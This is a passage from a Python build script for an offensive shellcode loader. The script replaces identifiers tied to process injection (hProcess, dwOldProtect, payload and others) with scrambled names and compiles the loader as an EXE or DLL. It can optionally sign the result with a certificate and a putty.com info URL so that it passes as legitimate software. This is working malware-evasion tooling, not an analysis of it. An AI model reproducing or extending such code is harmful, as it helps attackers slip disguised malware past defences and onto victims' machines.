                            if "ctx" in main_data[i]:
                                main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
                            if "hProcess" in main_data[i]:
                                main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
                            if "pProcess" in main_data[i]:
                                main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
                            if "dwSizeOfClearText" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
                            if "dwOldProtect" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
                            if "dwProcessId" in main_data[i]:
                                main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
                            if "payload" in main_data[i]:
                                main_data[i] = main_data[i].replace("payload", scrambled_variables[9])

                        with open(f"{dst_directory}/{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green("[+] Loader scrambled !"))

            # ----- Use custom output name if provided -----
            output_name = args.output if args.output else "afloader"

            if args.format is None or args.format == "EXE":
                if args.pfx:

                    print(Colors.green("[i] Signing selected."))
                    print(Colors.light_yellow("[+] Signing the loader..."))
                    
                    if args.pfx is not None:
                        pfx_path = args.pfx
                    else:
                        print(Colors.red("[!] PFX file not found"))
                        sys.exit(1)

                    if args.pfx_password:
                        pfx_password = args.pfx_password
                    else:
                        print(Colors.red("[!] PFX password not provided"))
                        sys.exit(1)

                    input_binary = f"{output_name}.exe"
                    signed_binary = f"{output_name}_signed.exe"

                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", input_binary)

                    if os.path.exists(signed_binary):
                        os.remove(signed_binary)

                    subprocess.run([
                        f"osslsigncode",
                        "sign",
                        "-pkcs12", pfx_path,
                        "-pass", pfx_password,
                        "-n", "Signed Loader",
                        "-i", "https://putty.com",
                        "-t", "http://timestamp.sectigo.com",
                        "-in", input_binary,
                        "-out", signed_binary
                    ], check=True)

                    shutil.rmtree(dst_directory)

                    print(Colors.green("[+] Loader signed !"))

                else:
                    
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")

                    shutil.move(f"{dst_directory}/afloader.exe", f"{output_name}.exe")

                    shutil.rmtree(dst_directory)

                    print(Colors.green("[+] Loader compiled !"))

                print(Colors.green("[+] DONE !"))

            if args.format == "DLL":

                print(Colors.green("[i] DLL format selected."))

                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")

                shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")

                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader compiled !"))

                print(Colors.green("[+] DONE !"))

if __name__ == "__main__":
    main()
